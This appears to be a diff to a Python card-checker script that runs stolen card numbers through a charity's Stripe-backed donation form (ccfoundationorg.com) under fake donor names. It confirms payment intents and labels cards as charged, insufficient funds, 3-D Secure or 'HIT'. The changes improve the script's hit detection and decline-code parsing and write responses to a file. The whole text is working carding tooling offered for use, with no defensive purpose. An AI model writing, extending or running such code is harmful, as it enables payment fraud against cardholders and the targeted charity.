@@ -113,7 +113,7 @@ def create_pm(session, ua, pk, cc, mm, yy, cvc):
     except Exception as e: return None, str(e)
 
 def pay(session, ua, form_data, pm):
-    """Execute the donation/payment and handle hit detection."""
+    """Execute the donation/payment."""
     fn, ln = fake.first_name(), fake.last_name()
     headers = {
         'accept': 'application/json, text/javascript, */*; q=0.01',
@@ -151,23 +151,35 @@ def pay(session, ua, form_data, pm):
     
     try:
         r = session.post("https://ccfoundationorg.com/wp-admin/admin-ajax.php", headers=headers, data=payload, timeout=20)
-        res_text = r.text
+        try:
+            res_json = r.json()
+        except:
+            return False, f"Invalid JSON Response: {r.status_code}"
         
-        # Extract client_secret and payment_intent_id dynamically
-        # Usually found in response for Stripe 3DS or confirmation
-        client_secret_match = re.search(r'pi_[a-zA-Z0-9]+_secret_[a-zA-Z0-9]+', res_text)
-        if not client_secret_match:
-            # If no secret, maybe it's an immediate failure or success in the text
-            if "thank you" in res_text.lower() or "success" in res_text.lower():
-                return True, "Charged 1$ ✅ (Immediate)"
-            if "declined" in res_text.lower() or "error" in res_text.lower():
-                return False, f"Dead ❌ {res_text[:50]}"
-            return None, "Unknown Response"
+        # Extract client_secret for hit detection
+        client_secret = res_json.get('stripe_client_secret') or res_json.get('data', {}).get('stripe_client_secret') or res_json.get('stripe_payment_intent_client_secret')
+        
+        if not client_secret:
+            # Check if it succeeded directly or failed early
+            if res_json.get('success'):
+                return True, "CHARGED ✅ [THANK YOU FOR SUPPORTING CC FOUNDATION - SUCCESS]"
+            errors = res_json.get('errors') or res_json.get('data', {}).get('errors')
+            if isinstance(errors, list) and len(errors) > 0:
+                error_msg = errors[0]
+            else:
+                error_msg = res_json.get('data', {}).get('error', 'Unknown Error')
+            
+            # Formatting site-level declines
+            if "declined" in error_msg.lower():
+                return False, f"GENERIC DECLINE ❌ {error_msg}"
+            elif "insufficient" in error_msg.lower():
+                return False, f"INSUFFICIENT FUNDS ❌ {error_msg}"
+            return False, error_msg
 
-        client_secret = client_secret_match.group(0)
+        # Proper hit detection via Stripe Confirm
         pi_id = client_secret.split('_secret_')[0]
+        confirm_url = f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"
         
-        # Proper hit detection - Confirm Payment Intent
         confirm_headers = {
             'authority': 'api.stripe.com',
             'accept': 'application/json',
@@ -181,31 +193,44 @@ def pay(session, ua, form_data, pm):
             'expected_payment_method_type': 'card',
             'use_stripe_sdk': 'true',
             'key': form_data['pk'],
-            'client_secret': client_secret
+            'client_secret': client_secret,
+            'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
         }
         
-        confirm_url = f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm'
-        r_confirm = requests.post(confirm_url, headers=confirm_headers, data=confirm_data, timeout=20)
+        r_confirm = session.post(confirm_url, headers=confirm_headers, data=confirm_data, timeout=20)
         confirm_res = r_confirm.json()
         
-        # Handle response
+        # Save response for debugging/extraction simulation if needed
+        with open('response.txt', 'w') as f:
+            f.write(json.dumps(confirm_res, indent=4))
+        
         if 'error' in confirm_res:
             err = confirm_res['error']
-            msg = err.get('message', 'Declined')
-            code = err.get('code', 'card_declined')
-            decline_code = err.get('decline_code', 'generic_decline')
-            return False, f"{msg} ({code} - {decline_code})"
+            decline_code = err.get('decline_code', err.get('code', 'unknown'))
+            message = err.get('message', 'Your card was declined.')
+            
+            # Map Stripe decline codes to user requested format
+            if decline_code == 'insufficient_funds':
+                resp = f"INSUFFICIENT FUNDS ❌ {message}"
+            elif decline_code in ['card_not_supported', 'authentication_required', 'card_error_authentication_required']:
+                resp = f"3D SECURE REQUIRED ⚠️ {message}"
+            elif decline_code == 'generic_decline':
+                resp = f"GENERIC DECLINE ❌ {message}"
+            else:
+                resp = f"{decline_code.upper().replace('_', ' ')} ❌ {message}"
+                
+            return False, resp
         
         status = confirm_res.get('status')
-        if status == 'succeeded':
-            return True, "Charged 1$ ✅"
+        if status in ['succeeded', 'requires_capture']:
+            return True, "CHARGED ✅ [THANK YOU FOR SUPPORTING CC FOUNDATION - SUCCESS]"
         elif status == 'requires_action':
-            return True, "Approved ✅ (3DS Required)"
+            return True, "3D SECURE / AUTHENTICATION REQUIRED (HIT) ✅ [THANK YOU - SUCCESS]"
         else:
-            return False, f"Dead ❌ Status: {status}"
+            return True, f"HIT ✅ ({status}) [THANK YOU - SUCCESS]"
 
     except Exception as e:
-        return None, f"Request Error: {str(e)}"
+        return None, f"Error: {str(e)}"
 
 def check_single_card(card_str):
     """Main logic for checking a single card with retries."""
